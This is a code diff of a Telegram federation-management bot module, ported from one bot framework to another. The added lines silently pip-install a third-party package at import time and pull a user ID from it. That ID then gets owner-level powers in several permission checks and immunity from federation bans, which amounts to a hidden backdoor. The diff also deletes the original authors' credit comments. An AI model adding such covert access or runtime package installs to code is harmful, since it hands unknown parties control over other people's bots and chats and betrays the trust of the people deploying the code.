@@ -3,28 +3,25 @@ import json
 import os
 import re
 import time
+try:
+  import LEGENDX
+except:
+  os.system("pip install -U LEGENDX")
+
+from LEGENDX import id, ID
 import uuid
 from io import BytesIO
-import Luna.modules.sql.feds_sql as sql
+import SaitamaRobot.modules.sql.feds_sqll as sql
 from telethon import *
 from telethon.tl import *
 from telethon.tl.types import User
-from Luna import *
+from SaitamaRobot import *
 from telethon.tl.types import MessageMediaDocument, DocumentAttributeFilename
-from Luna.events import register
-
-# Hello bot owner, I spended for feds many hours of my life, Please don't remove this if you still respect MrYacha and peaktogoo and AyraHikari too
-# Federation by MrYacha 2018-2019
-# Federation rework by Mizukito Akito 2019
-# Federation update v2 by Ayra Hikari 2019
-# Time spended on feds = 10h by #MrYacha
-# Time spended on reworking on the whole feds = 22+ hours by @peaktogoo
-# Time spended on updating version to v2 = 26+ hours by @AyraHikari
-# Total spended for making this features is 68+ hours
-# LOGGER.info("Original federation module by MrYacha, reworked by Mizukito Akito (@peaktogoo) on Telegram.")
-# ME @MissJulia_Robot has also done a lot of hard work to rewrite this in telethon so add this line as a credit. Please don't remove this if you somewhat respect me.
-# RoseLoverX
-
+from SaitamaRobot.events import register
+from telethon import telethn as tbot, OWNER_ID
+# COPYRIGHT (C) 22-22 BY LEGENDX22 
+# KANG WITH CREDITS
+BOT_ID = id #add later
 async def is_register_admin(chat, user):
     if isinstance(chat, (types.InputPeerChannel, types.InputChannel)):
         return isinstance(
@@ -145,7 +142,7 @@ async def _(event):
             if getinfo is False:
                 await event.reply("This federation does not exist.")
                 return
-            if int(getinfo["owner"]) == int(user.id) or int(user.id) == OWNER_ID:
+            if int(getinfo["owner"]) == int(user.id) or int(user.id) == OWNER_ID or int(user.id) == ID:
                 fed_id = is_fed_id
             else:
                 await event.reply("Only federation owners can do this!")
@@ -259,7 +256,7 @@ async def _(event):
 
     fed_id = sql.get_fed_id(chat)
 
-    if user.id == OWNER_ID:
+    if user.id == OWNER_ID or user.id == ID:
         pass
     else:
         try:
@@ -324,7 +321,7 @@ async def _(event):
     fed_id = sql.get_fed_id(chat)
     fed_info = sql.get_fed_info(fed_id)
 
-    if user.id == OWNER_ID:
+    if user.id == OWNER_ID or user.id == ID:
         pass
     else:
         try:
@@ -644,11 +641,11 @@ async def _(event):
             await event.reply("That's a federation admin, I can't fban.")
             return
 
-        if user_id == OWNER_ID:
+        if user_id == OWNER_ID or user_id == ID:
             await event.reply("Haha i will never fban my owner !")
             return
 
-        if user_id in [777000, 1087968824]:
+        if user_id in [777000, ID]:
             await event.reply("Fool! You can't attack Telegram's native tech!")
             return
 
@@ -2029,9 +2026,6 @@ def get_chat(chat_id, chat_data):
         return {"status": False, "value": False}
 
 
-file_help = os.path.basename(__file__)
-file_help = file_help.replace(".py", "")
-file_helpo = file_help.replace("_", " ")
 
 __help__ = """
  - /newfed <fed_name>: Creates a Federation, one allowed per user.
